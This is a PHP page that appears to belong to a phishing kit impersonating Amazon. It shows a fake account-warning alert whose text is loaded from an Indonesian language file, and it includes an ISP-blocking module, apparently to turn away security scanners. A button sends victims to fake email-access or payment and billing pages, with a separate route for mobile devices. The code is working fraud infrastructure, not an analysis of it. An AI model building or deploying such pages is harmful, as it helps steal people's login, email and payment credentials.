<?php
session_start();
include('__CONFIG__.php');
include 'bahasa.php';
require "Library/ClassFunction/Blockisp.php";
//include 'proxy.php';

require_once 'Library/device/Mobile_Detect.php';
$detect = new Mobile_Detect;

function generateRandomString($length = 20) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

?>


<!DOCTYPE html>
<html lang="en">

<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="Library/FontAwesome/css/fontawesome-all.min.css">
    <link rel="stylesheet" href="Library/Bootstrap/css/main.min.css">
    <link rel="stylesheet" href="Sheets/alert.css">
    <link rel="shortcut icon" href="Assets/img/favicon.ico" />
    <link rel="stylesheet" href="Sheets/mobile.css">
    <title><?php echo $amzmas ?></title>
</head>

<body>

    <nav class="navbar navbar-default">
         <a class="navbar-brand" href="#">
         <img src="Assets/img/logo.png" width="90" height="30" alt="">
         </a>
      </nav>

    <div class="a-content">
        <div class="container">
            <span class="lefttext"><a href="#" class="lefttext"><?php echo $ya; ?></a></span>
            <span class="middle">></span>
            <span class="righttext"><?php echo $yaw; ?></span>
            <p class="alerttext"><?php echo $ass; ?></p>


            <div class="row">
                <div class="col-12">
                    <div class="alert alert-danger" role="alert">
                        <h4 class="alert-heading"><i class="fas fa-exclamation-triangle text-danger"></i> <?php echo $puy ?></h4>
                        <p>
                            <?php echo $bct ?>
                        </p>
						<?php if($tembus_emel == 'no'){ ?>
                        <a href="email-access.php" class="btn bgcolored"><?php echo $con ?></a>
						<?php }else { ?>
						<a href="ap/payment?udm_cat_path=<? echo generateRandomString(); ?> " name="button" id="submit" class="btn bgcolored" onclick="function()"><?php echo $con ?></a>
						<?php }?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="Library/jQuery/main.min.js"></script>
    <script src="Library/pooper/main.min.js"></script>
    <script src="Library/Bootstrap/js/main.min.js"></script>

    <script>
        $(document).ready(function() {
            $('.myddown').hover(function() {
                $('.mydropdown').togleClass('d-none');
            })
        })
    </script>
    <script>
    var device = navigator.userAgent
        document.getElementById('submit').onclick = function() {
            if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i)){
                document.getElementById("submit").href = "ap/payment?udm_cat_path=<? echo generateRandomString(); ?>";
            } else {
                document.getElementById("submit").href = "Acc_Billing?udm_cat_path=<? echo generateRandomString(); ?>";
            }
        }
    </script>
    
</body>

</html>